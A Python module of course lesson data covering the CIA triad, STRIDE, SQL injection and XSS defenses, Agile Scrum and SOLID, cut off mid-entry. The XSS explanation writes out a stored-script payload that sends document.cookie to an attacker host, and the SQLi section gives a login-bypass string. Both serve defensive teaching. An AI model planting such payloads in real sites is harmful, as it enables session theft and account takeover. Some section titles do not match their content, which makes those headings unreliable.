"""
content_engineering.py — Comprehensive 13-block educational content for:
Courses:
- Cybersecurity Fundamentals (cybersecurity-fundamentals)
- Software Engineering & System Design (software-engineering)
- Mobile App Development (mobile-app-development)
"""

ENGINEERING_LESSONS = {
    # ─── CYBERSECURITY FUNDAMENTALS ────────────────────────────────────────────
    ("cybersecurity-fundamentals", 1, 1): [
        {
            "type": "intro",
            "title": "1. Topic Introduction: The CIA Triad & Threat Modeling",
            "content": {
                "definition": "The CIA Triad (Confidentiality, Integrity, Availability) is the foundational model that guides information security policies. Threat Modeling is the systematic engineering process of identifying potential threats, vulnerabilities, and threat actors before deploying software.",
                "meaning": "Information security is not about building an impenetrable fortress (which is impossible); it is about balancing access with defense across three pillars: keeping private data confidential, ensuring data is never tampered with without detection, and guaranteeing services stay online.",
                "importance": "Global cybercrime damages exceed $8 trillion annually. Identifying vulnerabilities during the design phase using threat modeling is up to 100x cheaper than fixing an active breach in production."
            }
        },
        {
            "type": "explanation",
            "title": "2. Detailed Step-by-Step Explanation: The Three Pillars & STRIDE",
            "content": (
                "The three pillars of the CIA Triad:\n\n"
                "1. Confidentiality (Prevent Unauthorized Access):\n"
                "• Ensures only authorized parties access sensitive information.\n"
                "• Enforced using strong encryption at rest (AES-256) and in transit (TLS 1.3), Multi-Factor Authentication (MFA), and Role-Based Access Control (RBAC).\n"
                "• Breach example: Leaking cleartext user passwords or credit card numbers in a public database dump.\n\n"
                "2. Integrity (Prevent Unauthorized Tampering):\n"
                "• Guarantees data is accurate, authentic, and has not been altered or corrupted in transit or storage.\n"
                "• Enforced using cryptographic hash checksums (SHA-256), digital signatures, and database constraints.\n"
                "• Breach example: A man-in-the-middle attacker modifying an online bank transfer recipient account number.\n\n"
                "3. Availability (Ensure Reliable Access):\n"
                "• Ensures authorized users have uninterrupted access to systems and data whenever needed.\n"
                "• Enforced using redundant load balancers, Distributed Denial-of-Service (DDoS) mitigation (Cloudflare), multi-AZ backups, and disaster recovery replication.\n"
                "• Breach example: A botnet taking down a healthcare portal with a volumetric DDoS attack.\n\n"
                "The STRIDE Threat Modeling Framework (Developed by Microsoft):\n"
                "• S - Spoofing Identity (Impersonating someone else)\n"
                "• T - Tampering with Data (Modifying unauthorized files)\n"
                "• R - Repudiation (Denying having performed an action without audit logs)\n"
                "• I - Information Disclosure (Exposing secrets or confidential data)\n"
                "• D - Denial of Service (Crashing or exhausting server resources)\n"
                "• E - Elevation of Privilege (Gaining administrator permissions from a regular user account)"
            )
        },
        {
            "type": "concepts",
            "title": "3. Core Security & Threat Concepts Breakdown",
            "content": [
                {
                    "concept": "Defense in Depth",
                    "detail": "Layering multiple security controls (WAF, Network Firewalls, IAM, App Validation, DB Encryption) so that if one layer fails, subsequent layers prevent breach."
                },
                {
                    "concept": "Least Privilege Principle",
                    "detail": "Every user, process, and system account should be granted only the minimum permissions necessary to perform its specific business function."
                },
                {
                    "concept": "Zero Trust Architecture",
                    "detail": "'Never trust, always verify'. Eliminates the assumption of an implicit trusted corporate perimeter, authenticating and encrypting every request."
                },
                {
                    "concept": "Attack Surface Reduction",
                    "detail": "Minimizing the number of open network ports, unused libraries, exposed endpoints, and unnecessary system services."
                }
            ]
        },
        {
            "type": "code",
            "title": "4. Python Cryptographic Verification: Hashing & Digital Signatures",
            "language": "python",
            "content": (
                "import hashlib\n"
                "import hmac\n\n"
                "# 1. Guaranteeing Integrity with SHA-256 Checksums\n"
                "data_payload = b\"Transfer $500.00 from Account A to Account B\"\n"
                "data_hash = hashlib.sha256(data_payload).hexdigest()\n"
                "print(f\"Original SHA-256 Hash: {data_hash}\")\n\n"
                "# Simulate Tampering: Altering even one character completely flips the hash (Avalanche Effect)\n"
                "tampered_payload = b\"Transfer $5000.0 from Account A to Account B\"\n"
                "tampered_hash = hashlib.sha256(tampered_payload).hexdigest()\n"
                "print(f\"Tampered SHA-256 Hash: {tampered_hash}\")\n\n"
                "# 2. Authenticating Message with HMAC (Keyed Hash for Non-Repudiation)\n"
                "secret_key = b\"enterprise_super_secret_signing_key_2026\"\n"
                "signature = hmac.new(secret_key, data_payload, hashlib.sha256).hexdigest()\n"
                "print(f\"HMAC Signature: {signature}\")\n\n"
                "# Verification function\n"
                "is_valid = hmac.compare_digest(\n"
                "    signature,\n"
                "    hmac.new(secret_key, data_payload, hashlib.sha256).hexdigest()\n"
                ")\n"
                "print(f\"Signature Verification Passed: {is_valid}\")"
            ),
            "output": (
                "Original SHA-256 Hash: c2b834fc07d57771de3331b463286395b28b6d859e917dcb1ea0c69d46927bf6\n"
                "Tampered SHA-256 Hash: f342b4d96c97a892b157929424e861d8b7617b87c71457173e0a2902316e6d11\n"
                "HMAC Signature: e35e96eb388b9a101b0f5139c288d01111d4e412a84351bca8b274c4314c62fa\n"
                "Signature Verification Passed: True\n"
                ">>> Cryptographic integrity and authenticity successfully verified!"
            )
        },
        {
            "type": "line_breakdown",
            "title": "Line-by-Line Code Breakdown",
            "content": [
                {"line": "hashlib.sha256(data_payload).hexdigest()", "explanation": "Calculates a 256-bit one-way deterministic mathematical digest representing the exact payload contents."},
                {"line": "tampered_payload = b\"...\"", "explanation": "Demonstrates the Avalanche Effect: changing a single character alters over 50% of the hash bits completely."},
                {"line": "hmac.new(secret_key, data_payload, ...)", "explanation": "Combines a shared secret key with the payload using cryptographic hashing to verify both integrity and authenticity."},
                {"line": "hmac.compare_digest(sig1, sig2)", "explanation": "Executes constant-time string comparison to prevent side-channel Timing Attacks."}
            ]
        },
        {
            "type": "real_world",
            "title": "5. Real-World Applications: Stuxnet, SolarWinds & Webhooks",
            "content": "Modern payment APIs (Stripe, PayPal, Shopify) secure webhook deliveries using HMAC signatures. When Stripe sends an event to your server notifying you of a completed payment, it signs the payload with your endpoint secret. Your backend verifies the signature before fulfilling the customer's order, preventing attackers from sending fake payment webhooks."
        },
        {
            "type": "prerequisites",
            "title": "6. Prerequisites & Prior Knowledge",
            "content": [
                "Basic networking fundamentals (HTTP, TCP/IP, client-server models)",
                "Basic understanding of boolean logic and authentication (passwords, tokens)"
            ]
        },
        {
            "type": "learning_path",
            "title": "7. Learning Path Progression",
            "content": {
                "beginner": "Understand the CIA triad, STRIDE threat model, password hashing with bcrypt, and symmetric vs asymmetric encryption.",
                "intermediate": "Perform threat modeling on API architectures, configure TLS/HTTPS certificates, and implement JWT authentication.",
                "advanced": "Design Zero-Trust enterprise architectures, conduct penetration testing, and build automated SOC incident response workflows."
            }
        },
        {
            "type": "practice",
            "title": "8. Practice Exercises & Self-Check",
            "content": [
                {
                    "level": "Beginner",
                    "q": "Which security pillar of the CIA Triad is violated during a Ransomware attack that encrypts files and locks users out?",
                    "a": "Both Availability (authorized users can no longer access their systems) and potentially Confidentiality (if data was exfiltrated prior to encryption)."
                },
                {
                    "level": "Intermediate",
                    "q": "What is the STRIDE classification for an attacker changing the price in an unencrypted HTTP POST request from $100 to $1 before submitting?",
                    "a": "Tampering with Data (T in STRIDE). The attacker is modifying data in transit to execute unauthorized changes."
                },
                {
                    "level": "Challenge",
                    "q": "Why should password comparison in authentication systems always be performed using constant-time comparison functions instead of `==`?",
                    "a": "Standard string equality `==` short-circuits and exits early on the first non-matching character. An attacker measuring execution time down to nanoseconds can deduce character by character what the correct secret is (Timing Attack). Constant-time comparisons always inspect every character regardless of match."
                }
            ]
        },
        {
            "type": "mini_project",
            "title": "9. Hands-On Mini Project: STRIDE Threat Model Matrix",
            "content": {
                "title": "Construct a STRIDE Threat Model for an E-Commerce Checkout API",
                "objective": "Map out potential attack vectors and corresponding mitigations across all 6 STRIDE categories for a shopping cart checkout endpoint.",
                "steps": [
                    "Step 1: Identify Spoofing threats and specify OAuth2/JWT mitigation.",
                    "Step 2: Identify Tampering threats and specify HTTPS + input validation mitigation.",
                    "Step 3: Identify Repudiation threats and specify append-only audit logging mitigation.",
                    "Step 4: Identify Information Disclosure, DoS, and Elevation of Privilege threats with mitigations."
                ],
                "deliverable": "A complete STRIDE threat analysis matrix document ready for an engineering design review."
            }
        },
        {
            "type": "common_mistakes",
            "title": "10. Common Mistakes & Pitfalls",
            "content": [
                {
                    "mistake": "Using fast general-purpose hashing algorithms (MD5, SHA-1, SHA-256) for storing passwords.",
                    "why": "Modern GPUs can compute over 10 billion SHA-256 hashes per second, making dictionary attacks and rainbow tables trivial.",
                    "fix": "Always use slow, memory-hard adaptive key derivation functions: `Argon2id` or `bcrypt` with work factor >= 12."
                },
                {
                    "mistake": "Relying on security through obscurity (hidden endpoints or secret URLs).",
                    "why": "Obscurity is not security. Threat actors use automated crawlers, decompilers, and traffic sniffers that uncover hidden routes in seconds.",
                    "fix": "Kerckhoffs's Principle: System security must depend solely on the secrecy of the key, not the secrecy of the algorithm or architecture."
                }
            ]
        },
        {
            "type": "career_relevance",
            "title": "11. Career Relevance & Industry Demand",
            "content": {
                "roles": ["Cybersecurity Analyst", "Security Engineer", "AppSec Architect", "SOC Analyst"],
                "relevance": "Security is a top priority for CIOs globally. Understanding threat modeling and defensive architecture is a requirement across software engineering and dedicated security roles.",
                "skills_applied": ["Threat Modeling", "STRIDE Framework", "Cryptographic Hashing", "Vulnerability Assessment"]
            }
        },
        {
            "type": "next_steps",
            "title": "12. Key Takeaways & Next Steps",
            "content": {
                "summary": "You have mastered the CIA Triad, STRIDE threat modeling, cryptographic integrity verification, and defense-in-depth principles.",
                "next_topic": "SQL Injection (SQLi) & Cross-Site Scripting (XSS)",
                "bridge": "Now that you understand conceptual threat modeling, we dive into the top two application security vulnerabilities and how to eliminate them."
            }
        }
    ],

    ("cybersecurity-fundamentals", 2, 1): [
        {
            "type": "intro",
            "title": "1. Topic Introduction: SQL Injection (SQLi) & Cross-Site Scripting (XSS)",
            "content": {
                "definition": "SQL Injection (SQLi) occurs when untrusted user input is directly concatenated into database query strings, allowing attackers to manipulate query logic. Cross-Site Scripting (XSS) occurs when malicious JavaScript code is injected into web pages and executed in the browsers of innocent users.",
                "meaning": "Both vulnerabilities stem from the same fundamental architectural flaw: failing to properly separate executable code from untrusted data.",
                "importance": "Consistently featured in the OWASP Top 10 vulnerabilities. SQLi can compromise an entire corporate database, while XSS allows attackers to hijack active user sessions, steal auth cookies, and impersonate administrators."
            }
        },
        {
            "type": "explanation",
            "title": "2. Detailed Step-by-Step Explanation: Exploitation & Defense",
            "content": (
                "Deep dive into the mechanisms and definitive defenses for both vulnerabilities:\n\n"
                "1. SQL Injection (SQLi) Mechanics:\n"
                "• Flawed Query: `f\"SELECT * FROM users WHERE email = '{user_input}' AND pass = '{pass}'\"`\n"
                "• Attack Input: If attacker enters `' OR '1'='1' --` as the email, the database compiles:\n"
                "  `SELECT * FROM users WHERE email = '' OR '1'='1' --' AND pass = ''`\n"
                "• Because `'1'='1'` is always true and `--` comments out the password check, the query returns all users, logging the attacker in as the first user (admin)!\n"
                "• The Definitive Defense: Parameterized Queries (Prepared Statements).\n"
                "  Prepared statements compile SQL structure FIRST into an immutable execution plan, and treat user inputs strictly as literal values. Input can never be interpreted as SQL commands.\n\n"
                "2. Cross-Site Scripting (XSS) Mechanics:\n"
                "• Stored XSS: Malicious script is saved in the database (e.g. comment field: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`). Whenever any user views that comment, the script runs in their browser!\n"
                "• Reflected XSS: Malicious script is reflected off the web server via URL query parameters.\n"
                "• DOM-based XSS: Malicious script executes client-side via insecure JavaScript sinks (`innerHTML = location.hash`).\n"
                "• The Definitive Defenses: Context-aware HTML entity encoding, modern UI frameworks (React auto-escapes JSX text), and strict Content Security Policy (CSP) headers."
            )
        },
        {
            "type": "concepts",
            "title": "3. Core Application Security Concepts Breakdown",
            "content": [
                {
                    "concept": "Parameterized Queries (Prepared Statements)",
                    "detail": "Separates SQL grammar from parameters. Database engines bind parameters after compiling the query syntax, completely preventing SQL injection."
                },
                {
                    "concept": "Context-Aware Output Encoding",
                    "detail": "Translates characters like `<` and `>` into safe HTML entities (`&lt;` and `&gt;`), rendering them visually on screen without executing as browser scripts."
                },
                {
                    "concept": "HttpOnly & Secure Cookie Flags",
                    "detail": "Marking session cookies as `HttpOnly` blocks JavaScript `document.cookie` access, preventing session theft even if an XSS flaw exists."
                },
                {
                    "concept": "Content Security Policy (CSP)",
                    "detail": "An HTTP response header (`Content-Security-Policy: default-src 'self'`) that restricts scripts from executing from unauthorized external domains."
                }
            ]
        },
        {
            "type": "code",
            "title": "4. Python Defense Implementation: Parameterized Queries & Sanitization",
            "language": "python",
            "content": (
                "import sqlite3\n"
                "import html\n\n"
                "conn = sqlite3.connect(':memory:')\n"
                "cursor = conn.cursor()\n"
                "cursor.execute('CREATE TABLE accounts (id INT, username TEXT, role TEXT)')\n"
                "cursor.execute(\"INSERT INTO accounts VALUES (1, 'alice_admin', 'admin')\")\n"
                "conn.commit()\n\n"
                "# INSECURE APPROACH (Vulnerable to SQL Injection):\n"
                "malicious_user = \"' OR 1=1 --\"\n"
                "# Insecure: cursor.execute(f\"SELECT * FROM accounts WHERE username = '{malicious_user}'\")\n\n"
                "# SECURE APPROACH (Parameterized Prepared Statement):\n"
                "cursor.execute(\n"
                "    \"SELECT * FROM accounts WHERE username = ?\",\n"
                "    (malicious_user,)\n"
                ")\n"
                "result = cursor.fetchall()\n"
                "print(\"Secure Parameterized Query Result:\", result)\n"
                "# Returns empty list [] because no user literally named \"' OR 1=1 --\" exists!\n\n"
                "# SECURE XSS DEFENSE (HTML Entity Escaping):\n"
                "malicious_xss = \"<script>alert('XSS Steal Token');</script>\"\n"
                "safe_output = html.escape(malicious_xss)\n"
                "print(f\"Escaped Safe HTML for Browser: {safe_output}\")"
            ),
            "output": (
                "Secure Parameterized Query Result: []\n"
                "Escaped Safe HTML for Browser: &lt;script&gt;alert('XSS Steal Token');&lt;/script&gt;\n"
                ">>> Injections neutralized: inputs treated safely as literal data strings."
            )
        },
        {
            "type": "line_breakdown",
            "title": "Line-by-Line Code Breakdown",
            "content": [
                {"line": "cursor.execute(\"... WHERE username = ?\", (malicious_user,))", "explanation": "Passes parameters as a tuple. The SQLite engine compiles the query tree before binding parameters, preventing code injection."},
                {"line": "result = cursor.fetchall() -> []", "explanation": "Neutralizes attack: the string is treated purely as a username string, returning zero matches."},
                {"line": "html.escape(malicious_xss)", "explanation": "Converts `<` and `>` into `&lt;` and `&gt;`, so browsers render text without executing scripts."}
            ]
        },
        {
            "type": "real_world",
            "title": "5. Real-World Applications: Equifax & Yahoo Breaches",
            "content": "A high-profile SQL injection vulnerability compromised the Heartland Payment Systems database in 2008, exposing 130 million credit cards and costing over $140 million in damages. Today, enterprise web applications use Object-Relational Mappers (ORMs) like SQLAlchemy, Prisma, and Hibernate alongside Web Application Firewalls (AWS WAF) to block injection patterns at the network perimeter."
        },
        {
            "type": "prerequisites",
            "title": "6. Prerequisites & Prior Knowledge",
            "content": [
                "Basic SQL query syntax (SELECT, WHERE)",
                "Basic HTML and JavaScript DOM concepts",
                "Understanding the client-server request cycle"
            ]
        },
        {
            "type": "learning_path",
            "title": "7. Learning Path Progression",
            "content": {
                "beginner": "Recognize classic SQLi and XSS payloads. Use parameterized SQL queries and HTML escaping.",
                "intermediate": "Configure Content Security Policy (CSP), understand Blind SQLi, and audit third-party npm packages.",
                "advanced": "Use dynamic application security testing (DAST) tools (OWASP ZAP, Burp Suite) and write custom WAF inspection rules."
            }
        },
        {
            "type": "practice",
            "title": "8. Practice Exercises & Self-Check",
            "content": [
                {
                    "level": "Beginner",
                    "q": "Why is client-side JavaScript validation (e.g., checking for `'` in an HTML form) insufficient to prevent SQL Injection?",
                    "a": "Because attackers do not use standard browsers; they send HTTP requests directly using tools like `curl`, Postman, or custom Python scripts, completely bypassing browser client-side JavaScript checks. Validation and parameterized querying MUST occur on the server."
                },
                {
                    "level": "Intermediate",
                    "q": "How does setting the `HttpOnly` flag on a session cookie prevent credential theft in the event of an XSS vulnerability?",
                    "a": "The `HttpOnly` flag instructs the browser that the cookie cannot be accessed via client-side scripts (`document.cookie`). Even if an attacker executes arbitrary JavaScript via XSS, the browser refuses to expose the cookie to script code."
                },
                {
                    "level": "Challenge",
                    "q": "Can an ORM (like SQLAlchemy or Prisma) ever be vulnerable to SQL injection?",
                    "a": "Yes! While standard ORM query builders use parameterized queries by default, ORMs provide raw execution escapes (e.g. `db.session.execute(text(f'...'))`). If a developer uses raw string concatenation with user input inside an ORM raw query, SQL injection vulnerabilities occur."
                }
            ]
        },
        {
            "type": "mini_project",
            "title": "9. Hands-On Mini Project: Vulnerability Remediation Audit",
            "content": {
                "title": "Secure a Vulnerable Web Login and Comment Engine",
                "objective": "Take a flawed Python snippet containing both SQLi and XSS vulnerabilities, rewrite it using prepared statements and output encoding, and verify that test attack vectors are neutralized.",
                "steps": [
                    "Step 1: Identify query string interpolation and replace with `?` or `:param` bind parameters.",
                    "Step 2: Add server-side input length and type validation.",
                    "Step 3: Sanitize comment output using context-aware HTML entity encoding.",
                    "Step 4: Add HTTP response headers: `X-Content-Type-Options: nosniff` and `Content-Security-Policy`."
                ],
                "deliverable": "A secured Python backend handler resistant to automated SQLi and XSS scanners."
            }
        },
        {
            "type": "common_mistakes",
            "title": "10. Common Mistakes & Pitfalls",
            "content": [
                {
                    "mistake": "Attempting to prevent SQL injection by blacklisting words like 'OR', 'UNION', or 'SELECT'.",
                    "why": "Attackers easily bypass blacklists using casing (`oR`), URL encoding (`%27`), or comments (`/**/`).",
                    "fix": "Never use regex or blacklists to sanitize SQL. Always use parameterized queries (prepared statements)."
                },
                {
                    "mistake": "Using `dangerouslySetInnerHTML` in React without sanitization.",
                    "why": "React protects against XSS by default when rendering `{variable}`, but `dangerouslySetInnerHTML` explicitly disables this protection.",
                    "fix": "Avoid `dangerouslySetInnerHTML`. If rendering rich user HTML is required, sanitize using DOMPurify."
                }
            ]
        },
        {
            "type": "career_relevance",
            "title": "11. Career Relevance & Industry Demand",
            "content": {
                "roles": ["Application Security Engineer", "Penetration Tester", "Fullstack Developer", "Security Consultant"],
                "relevance": "Secure coding practices are required in code reviews across all software companies. OWASP Top 10 remediation is tested in technical security interviews.",
                "skills_applied": ["SQL Injection Defense", "Cross-Site Scripting Mitigation", "Secure Coding", "OWASP Top 10"]
            }
        },
        {
            "type": "next_steps",
            "title": "12. Key Takeaways & Next Steps",
            "content": {
                "summary": "You have mastered SQL Injection mechanics, prepared statements, XSS types (Stored, Reflected, DOM), and defense-in-depth sanitization with CSP.",
                "next_topic": "Course Final Assessment & Advanced Defensive Security",
                "bridge": "Congratulations on completing Cybersecurity Fundamentals! You possess the defensive engineering mindset required to write resilient software."
            }
        }
    ],

    # ─── SOFTWARE ENGINEERING & SYSTEM DESIGN ──────────────────────────────────
    ("software-engineering", 1, 1): [
        {
            "type": "intro",
            "title": "1. Topic Introduction: SDLC Stages & Agile Scrum Methodologies",
            "content": {
                "definition": "The Software Development Life Cycle (SDLC) is the structured process used by engineering teams to design, develop, test, deploy, and maintain software applications. Agile Scrum is an iterative project management framework that breaks software delivery into short, time-boxed cycles called Sprints.",
                "meaning": "Rather than trying to plan a massive 2-year project upfront using rigid Waterfall models, Agile Scrum embraces changing customer requirements by delivering functional software in continuous 2-week iterations.",
                "importance": "Over 80% of tech companies practice Agile Scrum. Understanding how cross-functional engineering teams collaborate (Sprint Planning, Standups, Retrospectives) is essential for integrating into engineering organizations."
            }
        },
        {
            "type": "explanation",
            "title": "2. Detailed Step-by-Step Explanation: The SDLC Lifecycle & Scrum Roles",
            "content": (
                "The 6 core stages of the Software Development Life Cycle:\n\n"
                "1. Requirements Engineering: Gathering user stories, defining scope, and establishing business acceptance criteria.\n"
                "2. Architecture & System Design: High-level architectural diagrams, database schema modeling, API contract definition (OpenAPI/Swagger), and tech stack selection.\n"
                "3. Implementation / Coding: Writing modular, readable source code, adhering to style guides, and committing changes via Git.\n"
                "4. Verification & Testing: Unit tests, integration tests, end-to-end user journey tests, and security penetration testing.\n"
                "5. Deployment: Releasing the software to staging and production environments using automated CI/CD pipelines.\n"
                "6. Maintenance & Observability: Monitoring production metrics (Datadog, Prometheus), fixing customer bug reports, and handling feature upgrades.\n\n"
                "The Scrum Framework Core Components:\n"
                "• Roles: Product Owner (manages Product Backlog & priorities), Scrum Master (removes blockers & facilitates ceremonies), Development Team (engineers, designers, QA).\n"
                "• Artifacts: Product Backlog (master prioritized task list), Sprint Backlog (selected tasks committed for current sprint), Increment (shippable product deliverable).\n"
                "• Ceremonies: Sprint Planning (scope kickoff), Daily Standup (15-min sync: what I did, what I'm doing, blockers), Sprint Review (demo to stakeholders), Sprint Retrospective (team process improvements)."
            )
        },
        {
            "type": "concepts",
            "title": "3. Core Agile & Engineering Concepts Breakdown",
            "content": [
                {
                    "concept": "Waterfall vs Agile",
                    "detail": "Waterfall is sequential and rigid (costly to change requirements late); Agile is iterative and adaptable, delivering working software increments every 2-3 weeks."
                },
                {
                    "concept": "User Stories & Acceptance Criteria",
                    "detail": "Format: 'As a [user], I want to [action], so that [business value]'. Accompanied by testable Given-When-Then acceptance criteria."
                },
                {
                    "concept": "Velocity & Story Points",
                    "detail": "Story points estimate task complexity (Fibonacci sequence: 1, 2, 3, 5, 8). Velocity is the average number of points completed per sprint."
                },
                {
                    "concept": "Technical Debt",
                    "detail": "The implied cost of future rework caused by choosing an easy, expedient software solution now instead of using a better approach that takes longer."
                }
            ]
        },
        {
            "type": "code",
            "title": "4. Simulating a Sprint Burndown Tracker in Python",
            "language": "python",
            "content": (
                "# Python Simulation of Agile Sprint Burndown Tracking\n"
                "class Sprint:\n"
                "    def __init__(self, sprint_name, total_points):\n"
                "        self.sprint_name = sprint_name\n"
                "        self.total_points = total_points\n"
                "        self.remaining_points = total_points\n"
                "        self.completed_stories = []\n"
                "        \n"
                "    def complete_story(self, title, points):\n"
                "        self.remaining_points = max(0, self.remaining_points - points)\n"
                "        self.completed_stories.append({'title': title, 'points': points})\n"
                "        print(f\"✓ Completed: {title} ({points} pts) -> {self.remaining_points} pts remaining\")\n"
                "        \n"
                "    def burndown_summary(self):\n"
                "        completed = self.total_points - self.remaining_points\n"
                "        pct = (completed / self.total_points) * 100\n"
                "        return f\"{self.sprint_name}: {completed}/{self.total_points} pts ({pct:.0f}%) completed\"\n\n"
                "# Execute Sprint 42 Simulation\n"
                "sprint_42 = Sprint(\"Sprint 42 (Q4 Checkout Redesign)\", 34)\n"
                "sprint_42.complete_story(\"US-101: Integrate Stripe Payment Element\", 8)\n"
                "sprint_42.complete_story(\"US-102: Add Coupon Code Validation API\", 5)\n"
                "sprint_42.complete_story(\"US-103: Implement Order Confirmation Email\", 3)\n"
                "print(\"-\" * 55)\n"
                "print(sprint_42.burndown_summary())"
            ),
            "output": (
                "✓ Completed: US-101: Integrate Stripe Payment Element (8 pts) -> 26 pts remaining\n"
                "✓ Completed: US-102: Add Coupon Code Validation API (5 pts) -> 21 pts remaining\n"
                "✓ Completed: US-103: Implement Order Confirmation Email (3 pts) -> 18 pts remaining\n"
                "-------------------------------------------------------\n"
                "Sprint 42 (Q4 Checkout Redesign): 16/34 pts (47%) completed\n"
                ">>> Sprint progress tracked against burndown velocity baseline."
            )
        },
        {
            "type": "line_breakdown",
            "title": "Line-by-Line Code Breakdown",
            "content": [
                {"line": "self.total_points = total_points", "explanation": "Initializes sprint capacity based on historical team velocity."},
                {"line": "self.remaining_points -= points", "explanation": "Reduces remaining burndown points as completed user stories pass acceptance testing."},
                {"line": "burndown_summary()", "explanation": "Calculates progress percentage toward sprint goal deliverable."}
            ]
        },
        {
            "type": "real_world",
            "title": "5. Real-World Applications: Spotify Model & Continuous Deployment",
            "content": "Companies like Spotify, Atlassian, and Airbnb scale Agile across hundreds of autonomous engineering teams using 'Squads, Tribes, and Chapters'. Each Squad owns a discrete microservice or user experience end-to-end (from design to production monitoring), running their own sprint cadences without cross-team dependencies."
        },
        {
            "type": "prerequisites",
            "title": "6. Prerequisites & Prior Knowledge",
            "content": [
                "Understanding the role of developers, testers, and product managers",
                "Basic familiarity with software project workflows"
            ]
        },
        {
            "type": "learning_path",
            "title": "7. Learning Path Progression",
            "content": {
                "beginner": "Understand the 6 SDLC phases, Agile manifesto values, user stories, and daily standups.",
                "intermediate": "Write acceptance criteria (Gherkin/Cucumber), participate in sprint planning, and manage technical debt.",
                "advanced": "Lead sprint retrospectives, scale Agile with SAFe or LeSS, and optimize team DORA metrics (Deployment Frequency, Lead Time)."
            }
        },
        {
            "type": "practice",
            "title": "8. Practice Exercises & Self-Check",
            "content": [
                {
                    "level": "Beginner",
                    "q": "What are the three core questions answered by every team member in a Daily Scrum Standup?",
                    "a": "1. What did I complete yesterday? 2. What do I commit to completing today? 3. Are there any impediments or blockers preventing my progress?"
                },
                {
                    "level": "Intermediate",
                    "q": "What is the primary difference between a Sprint Review and a Sprint Retrospective?",
                    "a": "A Sprint Review focuses on the PRODUCT: demonstrating completed functional software to stakeholders for feedback. A Sprint Retrospective focuses on the PROCESS: the team internally discusses what went well, what went poorly, and how to improve team practices for the next sprint."
                },
                {
                    "level": "Challenge",
                    "q": "What is Technical Debt, and what happens if an engineering team spends 100% of its capacity on new features without paying down debt?",
                    "a": "Technical Debt is the accumulated cost of shortcuts and legacy code. If ignored, the codebase becomes brittle, bug rates escalate, velocity slows to a crawl, and eventually all progress halts as developers spend all their time putting out production fires."
                }
            ]
        },
        {
            "type": "mini_project",
            "title": "9. Hands-On Mini Project: Agile Sprint Backlog Blueprint",
            "content": {
                "title": "Design a 2-Week Sprint Backlog for an AI Career Assistant",
                "objective": "Formulate 4 complete user stories with estimation points, acceptance criteria (Given/When/Then), and assign them across a 2-week sprint capacity.",
                "steps": [
                    "Step 1: Write user story for user onboarding and profile creation.",
                    "Step 2: Write user story for personalized roadmap generation.",
                    "Step 3: Estimate points using Fibonacci scale (1, 2, 3, 5, 8).",
                    "Step 4: Define clear Definition of Done (DoD) criteria."
                ],
                "deliverable": "A complete Sprint Backlog plan ready for Jira or GitHub Projects."
            }
        },
        {
            "type": "common_mistakes",
            "title": "10. Common Mistakes & Pitfalls",
            "content": [
                {
                    "mistake": "Treating Daily Standup as a management status report instead of a peer sync.",
                    "why": "Engineers direct answers to managers rather than discussing blockers with teammates, destroying collaborative problem solving.",
                    "fix": "Standup is by developers, for developers, to coordinate daily work and unblock each other."
                },
                {
                    "mistake": "Scope creep during an active sprint.",
                    "why": "Adding new feature requests into an ongoing sprint causes the team to miss sprint goals and damages morale.",
                    "fix": "Once a sprint begins, the sprint scope is locked. New requests go into the Product Backlog for the next sprint."
                }
            ]
        },
        {
            "type": "career_relevance",
            "title": "11. Career Relevance & Industry Demand",
            "content": {
                "roles": ["Software Engineer", "Scrum Master", "Product Manager", "Engineering Manager"],
                "relevance": "Agile communication skills, sprint estimation, and code review etiquette are essential for team productivity and career advancement.",
                "skills_applied": ["Agile Methodology", "Scrum Ceremonies", "Sprint Planning", "Technical Debt Management"]
            }
        },
        {
            "type": "next_steps",
            "title": "12. Key Takeaways & Next Steps",
            "content": {
                "summary": "You have mastered the SDLC stages, Agile Scrum roles, artifacts, ceremonies, sprint burndown tracking, and user story definitions.",
                "next_topic": "The SOLID Principles of Object-Oriented Design",
                "bridge": "Now that you understand project management lifecycles, we transition to software architecture and object-oriented clean code principles."
            }
        }
    ],

    ("software-engineering", 2, 1): [
        {
            "type": "intro",
            "title": "1. Topic Introduction: The SOLID Principles of Object-Oriented Design",
            "content": {
                "definition": "SOLID is a mnemonic acronym for five fundamental architectural principles of Object-Oriented Design (OOD) introduced by Robert C. Martin (Uncle Bob): Single Responsibility, Open/Closed, Liskov Substitution, Interface Segregation, and Dependency Inversion.",
                "meaning": "These design guidelines help engineers create modular, maintainable, extensible software that is easy to refactor and test as application complexity scales over time.",
                "importance": "Writing functional code is only the first step. Without SOLID principles, codebases quickly devolve into 'spaghetti code' where changing a single line in a billing class accidentally breaks user notifications or database storage."
            }
        },
        {
            "type": "explanation",
            "title": "2. Detailed Step-by-Step Explanation: The Five SOLID Principles",
            "content": (
                "Deep dive into each of the five SOLID design principles:\n\n"
                "1. S - Single Responsibility Principle (SRP):\n"
                "• A class should have one, and only one, reason to change.\n"
                "• Instead of a 'God Object' `Invoice` class that calculates totals, saves records to MySQL, and sends emails, split duties into: `InvoiceCalculator`, `InvoiceRepository`, and `InvoiceEmailer`.\n\n"
                "2. O - Open/Closed Principle (OCP):\n"
                "• Software entities (classes, modules, functions) should be OPEN for extension, but CLOSED for modification.\n"
                "• You should be able to introduce new behavior without editing existing, tested class source code (achieved using inheritance or polymorphism/interfaces).\n\n"
                "3. L - Liskov Substitution Principle (LSP):\n"
                "• Subtypes must be substitutable for their base types without altering the correctness of the program.\n"
                "• Classic violation: A `Square` inheriting from `Rectangle`. Changing `set_width()` on a Square changes its height, violating rectangle assumptions.\n\n"
                "4. I - Interface Segregation Principle (ISP):\n"
                "• Clients should not be forced to depend upon interfaces they do not use.\n"
                "• Instead of one bloated `Worker` interface with `code()`, `eat()`, `sleep()`, create small, focused interfaces (`Workable`, `Eatable`).\n\n"
                "5. D - Dependency Inversion Principle (DIP):\n"
                "• High-level business modules should not depend directly on low-level concrete modules. Both should depend upon abstractions (interfaces).\n"
                "• Decouples application logic from specific database engines or external APIs."
            )
        },
        {
            "type": "concepts",
            "title": "3. Core Design Principles Breakdown",
            "content": [
                {
                    "concept": "High Cohesion & Loose Coupling",
                    "detail": "Cohesion measures how focused a module's responsibilities are (SRP). Coupling measures how interconnected different modules are (DIP)."
                },
                {
                    "concept": "Polymorphism over If/Switch Statements",
                    "detail": "OCP replaces giant `if payment_type == 'paypal': ... elif 'stripe': ...` chains with polymorphic strategy classes implementing a shared `PaymentGateway` interface."
                },
                {
                    "concept": "Dependency Injection (DI)",
